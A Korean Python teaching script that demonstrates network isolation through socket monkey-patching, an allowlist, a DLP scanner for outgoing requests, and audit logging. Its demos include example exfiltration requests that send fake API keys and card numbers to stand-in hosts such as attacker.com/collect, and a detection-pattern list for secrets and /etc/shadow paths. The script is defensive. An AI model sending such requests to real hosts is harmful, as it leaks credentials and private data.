"""
실습 3: 네트워크 격리 시뮬레이션 (팀 질문 2)
============================================
프록시 제어와 네트워크 격리로 외부 데이터 유출을 차단하는 방법을 시연합니다.

소요 시간: ~10분
필요 패키지: 없음 (stdlib만 사용)

핵심 개념:
- Socket monkey-patching으로 네트워크 인터셉트
- 화이트리스트(Allowlist) 기반 접근 제어
- DLP(Data Loss Prevention) — 민감 데이터 유출 탐지
- 감사 로그(Audit Log) — 모든 요청 기록

팀 질문: "프록시 통제로 외부로 데이터 안나가는 거...?"
→ 이 실습에서 Python 레벨에서 네트워크 격리를 시뮬레이션합니다.
   실제 프로덕션에서는 iptables/network namespace로 OS 레벨에서 구현합니다.
"""

import re
import socket
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime
from typing import Optional


# ============================================================
# 섹션 1: 네트워크 격리 — Socket Monkey-Patching
# ============================================================

# 원본 socket 메서드 저장 (패치 해제를 위해)
_original_socket_connect = socket.socket.connect
_original_socket_connect_ex = socket.socket.connect_ex
_original_getaddrinfo = socket.getaddrinfo

# 감사 로그
audit_log = []

# 현재 격리 모드
_isolation_mode = None
_allowed_hosts: set = set()
_dlp_enabled = False


def _log_request(host: str, port: int, allowed: bool, reason: str = ""):
    """모든 네트워크 요청을 감사 로그에 기록"""
    entry = {
        'timestamp': datetime.now().strftime('%H:%M:%S.%f')[:-3],
        'host': host,
        'port': port,
        'allowed': allowed,
        'reason': reason,
    }
    audit_log.append(entry)

    status = "✅ 허용" if allowed else "🚫 차단"
    print(f"  [{entry['timestamp']}] {status} {host}:{port}"
          + (f" — {reason}" if reason else ""))


def _safe_connect(self, address):
    """인터셉트된 connect 메서드 — 화이트리스트 기반 제어"""
    if isinstance(address, tuple):
        host, port = address[0], address[1]
    else:
        host, port = str(address), 0

    # 격리 모드별 처리
    if _isolation_mode == 'block_all':
        _log_request(host, port, False, "완전 차단 모드")
        raise ConnectionRefusedError(
            f"🚫 네트워크 격리: '{host}'에 대한 접근이 차단되었습니다.\n"
            f"   (격리 모드: 완전 차단)"
        )

    elif _isolation_mode == 'whitelist':
        if host in _allowed_hosts or host.endswith(tuple(
            f".{h}" for h in _allowed_hosts if not h.startswith('.')
        )):
            _log_request(host, port, True)
            return _original_socket_connect(self, address)
        else:
            _log_request(host, port, False, f"화이트리스트에 없음")
            raise ConnectionRefusedError(
                f"🚫 네트워크 격리: '{host}'은 허용 목록에 없습니다.\n"
                f"   허용된 호스트: {', '.join(sorted(_allowed_hosts))}"
            )

    else:
        # 격리 없음 — 정상 연결
        return _original_socket_connect(self, address)


def enable_full_block():
    """모든 외부 네트워크 접근 차단"""
    global _isolation_mode
    _isolation_mode = 'block_all'
    socket.socket.connect = _safe_connect
    print("🔒 완전 차단 모드 활성화 — 모든 외부 접근이 차단됩니다.")


def enable_whitelist(allowed_hosts: set):
    """허용 목록에 있는 호스트만 접근 허용"""
    global _isolation_mode, _allowed_hosts
    _isolation_mode = 'whitelist'
    _allowed_hosts = allowed_hosts | {'localhost', '127.0.0.1', '::1'}
    socket.socket.connect = _safe_connect
    print(f"🔐 화이트리스트 모드 활성화 — 허용: {', '.join(sorted(_allowed_hosts))}")


def disable_isolation():
    """격리 해제 (원본 복원)"""
    global _isolation_mode
    _isolation_mode = None
    socket.socket.connect = _original_socket_connect
    print("🔓 네트워크 격리 해제됨")


# ============================================================
# 섹션 2: DLP — 민감 데이터 유출 탐지
# ============================================================

# 탐지 패턴 (정규식)
DLP_PATTERNS = [
    (re.compile(r'sk-ant-api[0-9a-zA-Z\-]{20,}'), 'Anthropic API 키'),
    (re.compile(r'sk-[a-zA-Z0-9]{40,}'), 'OpenAI API 키'),
    (re.compile(r'AKIA[A-Z0-9]{16}'), 'AWS Access Key ID'),
    (re.compile(r'[a-z0-9+/]{40}'), 'Base64 인코딩 데이터'),
    (re.compile(r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b'), '신용카드 번호'),
    (re.compile(r'password\s*[=:]\s*["\']?[^\s"\']{4,}', re.IGNORECASE), '비밀번호'),
    (re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'), '이메일 주소'),
    (re.compile(r'/etc/(passwd|shadow|hosts|ssh)', re.IGNORECASE), '시스템 파일 경로'),
]


def scan_for_sensitive_data(data: str) -> list:
    """전송 데이터에서 민감 정보 패턴을 스캔"""
    findings = []
    for pattern, description in DLP_PATTERNS:
        matches = pattern.findall(data)
        if matches:
            findings.append({
                'type': description,
                'count': len(matches),
                'sample': str(matches[0])[:30] + '...' if len(str(matches[0])) > 30 else str(matches[0]),
            })
    return findings


class DLPProxyHandler(urllib.request.BaseHandler):
    """urllib 요청을 인터셉트해 DLP 검사를 수행하는 핸들러"""

    def http_request(self, req):
        return self._inspect_request(req)

    def https_request(self, req):
        return self._inspect_request(req)

    def _inspect_request(self, req):
        url = req.full_url
        data = req.data

        print(f"\n  🔍 DLP 검사: {req.get_method()} {url[:60]}...")

        if data:
            data_str = data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else str(data)
            findings = scan_for_sensitive_data(data_str)

            if findings:
                print(f"  ⚠️  민감 데이터 탐지!")
                for f in findings:
                    print(f"     - {f['type']}: '{f['sample']}' ({f['count']}건)")
                raise PermissionError(
                    f"🚫 DLP 차단: 민감 데이터가 포함된 요청이 차단되었습니다.\n"
                    f"   탐지된 유형: {', '.join(f['type'] for f in findings)}"
                )

        return req


def enable_dlp():
    """DLP 핸들러 설치"""
    global _dlp_enabled
    _dlp_enabled = True
    opener = urllib.request.build_opener(DLPProxyHandler())
    urllib.request.install_opener(opener)
    print("🔍 DLP(데이터 유출 방지) 모드 활성화 — 모든 HTTP 요청을 검사합니다.")


# ============================================================
# 섹션 3: 데모 시나리오 모음
# ============================================================

def demo_full_block():
    """데모 1: 완전 차단 모드"""
    print("\n" + "=" * 60)
    print("📌 데모 1: 완전 차단 모드")
    print("   모든 외부 네트워크 접근을 차단합니다.")
    print("=" * 60)

    enable_full_block()
    audit_log.clear()

    test_targets = [
        ("google.com", 80),
        ("8.8.8.8", 53),
        ("attacker-server.com", 443),
        ("api.openai.com", 443),
    ]

    print("\n📡 외부 서버 접속 시도:")
    for host, port in test_targets:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.close()
            print(f"  ⚠️  접속 성공 (격리 실패!): {host}:{port}")
        except ConnectionRefusedError as e:
            pass  # 예상된 차단 (이미 _log_request에서 출력됨)
        except Exception as e:
            print(f"  ❓ 기타 오류: {host}:{port} — {e}")

    disable_isolation()
    print_audit_log()


def demo_whitelist():
    """데모 2: 화이트리스트 모드"""
    print("\n" + "=" * 60)
    print("📌 데모 2: 화이트리스트 모드")
    print("   허용된 도메인만 접근 가능합니다.")
    print("=" * 60)

    ALLOWED = {'api.anthropic.com', 'pypi.org', 'files.pythonhosted.org'}
    enable_whitelist(ALLOWED)
    audit_log.clear()

    test_targets = [
        ("localhost", 80, True),
        ("127.0.0.1", 8080, True),
        ("api.anthropic.com", 443, True),
        ("attacker.com", 80, False),
        ("google.com", 443, False),
        ("exfil-server.io", 443, False),
    ]

    print("\n📡 접속 시도 (허용 목록 vs 차단):")
    for host, port, expected_allow in test_targets:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((host, port))
            s.close()
        except ConnectionRefusedError:
            pass  # 화이트리스트 차단 (예상됨)
        except (OSError, socket.timeout):
            pass  # 실제 연결 실패 (정상)
        except Exception:
            pass

    disable_isolation()
    print_audit_log()


def demo_dlp():
    """데모 3: DLP 모드 — 민감 데이터 유출 탐지"""
    print("\n" + "=" * 60)
    print("📌 데모 3: DLP(Data Loss Prevention) 모드")
    print("   전송 데이터에서 민감 정보를 탐지·차단합니다.")
    print("=" * 60)

    enable_dlp()

    test_payloads = [
        {
            "name": "일반 데이터 (안전)",
            "data": b"search=python+tutorial&limit=10",
            "url": "https://httpbin.org/post",
        },
        {
            "name": "API 키 포함 (위험!)",
            "data": b"api_key=sk-ant-api03-xxxxxxxxxxxxxxxxxxxxx&query=secret",
            "url": "https://attacker-server.com/collect",
        },
        {
            "name": "신용카드 번호 포함 (위험!)",
            "data": b"card=4532-1234-5678-9012&exp=12/26&cvv=123",
            "url": "https://suspicious-site.io/payment",
        },
        {
            "name": "이메일 포함 (주의)",
            "data": b"email=user@company.com&data=private_info",
            "url": "https://third-party.com/api",
        },
    ]

    for payload in test_payloads:
        print(f"\n  📤 전송 시도: {payload['name']}")
        print(f"     데이터: {payload['data'][:50]}...")

        req = urllib.request.Request(
            payload['url'],
            data=payload['data'],
            method='POST',
        )
        try:
            # DLP 핸들러가 실제 전송 전에 인터셉트
            opener = urllib.request.build_opener(DLPProxyHandler())
            opener.open(req, timeout=1)
            print("  ✅ 전송 완료 (민감 데이터 없음)")
        except PermissionError as e:
            print(f"  {e}")
        except Exception:
            # 실제 네트워크 오류는 무시 (DLP 검사가 목적)
            if not _dlp_enabled:
                pass
            # DLP 통과 후 네트워크 오류는 정상
            print("  ✅ DLP 검사 통과 (네트워크 오류는 정상)")


def demo_comparison():
    """데모 4: 격리 없음 vs 격리 있음 비교"""
    print("\n" + "=" * 60)
    print("📌 데모 4: 격리 없음 vs 격리 있음 비교")
    print("=" * 60)

    # 민감 데이터가 포함된 악성 코드
    malicious_data = "api_key=sk-ant-api03-real-key-here&user_data=private"

    print("\n[격리 없음] 악성 코드가 데이터를 외부로 전송:")
    print(f"  코드: urllib.request.urlopen('http://attacker.com?{malicious_data[:40]}...')")
    print(f"  결과: ⚠️  실제 환경에서는 데이터가 유출됩니다!")

    print("\n[격리 있음] 동일한 코드 + DLP 활성화:")
    enable_dlp()
    enable_whitelist({'localhost'})
    audit_log.clear()

    req = urllib.request.Request(
        "https://attacker.com/collect",
        data=malicious_data.encode(),
        method='POST',
    )
    try:
        opener = urllib.request.build_opener(DLPProxyHandler())
        opener.open(req, timeout=1)
    except PermissionError:
        pass  # DLP 차단 (예상됨)
    except ConnectionRefusedError:
        print("  🚫 네트워크 격리로 차단됨")
    except Exception:
        pass

    disable_isolation()


def print_audit_log():
    """감사 로그 출력"""
    if not audit_log:
        return

    print(f"\n📋 감사 로그 ({len(audit_log)}건):")
    print(f"{'시간':<14} {'상태':<8} {'호스트':<30} {'포트':<8} {'사유'}")
    print("─" * 75)
    for entry in audit_log:
        status = "✅허용" if entry['allowed'] else "🚫차단"
        print(f"{entry['timestamp']:<14} {status:<8} {entry['host']:<30} "
              f"{entry['port']:<8} {entry['reason']}")


# ============================================================
# 메인: 대화형 인터페이스
# ============================================================

def print_banner():
    print("\n" + "=" * 60)
    print("🌐 Network Isolation Demo — 데이터 유출 차단")
    print("=" * 60)
    print("📌 프록시 제어와 DLP로 외부 데이터 유출을 방지합니다.")
    print()
    print("실제 프로덕션 구현 방법:")
    print("  1. Linux Network Namespace (OS 레벨 격리)")
    print("  2. iptables/nftables (방화벽 레벨)")
    print("  3. 이 실습: Socket Monkey-Patching (Python 레벨 시뮬레이션)")
    print()


if __name__ == '__main__':
    print_banner()

    print("데모를 선택하세요:")
    print("  [1] 완전 차단 모드 — 모든 외부 접근 차단")
    print("  [2] 화이트리스트 모드 — 허용 도메인만 접근")
    print("  [3] DLP 모드 — 민감 데이터 유출 탐지")
    print("  [4] 비교 데모 — 격리 없음 vs 있음")
    print("  [A] 전체 데모 순서대로 실행 (발표용)")
    print()

    choice = input("선택: ").strip().upper()

    demos = {
        '1': demo_full_block,
        '2': demo_whitelist,
        '3': demo_dlp,
        '4': demo_comparison,
    }

    if choice == 'A':
        for demo_fn in demos.values():
            demo_fn()
            input("\n   [Enter] 다음 데모...")
        print("\n\n📊 최종 요약:")
        print("   1. 완전 차단: 네트워크 Namespace처럼 외부 인터페이스 없음")
        print("   2. 화이트리스트: 필요한 서비스(pip, npm 저장소)만 허용")
        print("   3. DLP: 데이터 내용을 검사해 민감 정보 유출 차단")
        print("   4. Claude Code: 이 세 가지를 조합한 Proxy 제어 방식 사용")

    elif choice in demos:
        demos[choice]()

    else:
        print("잘못된 선택입니다.")

    print("\n👋 데모 종료.")
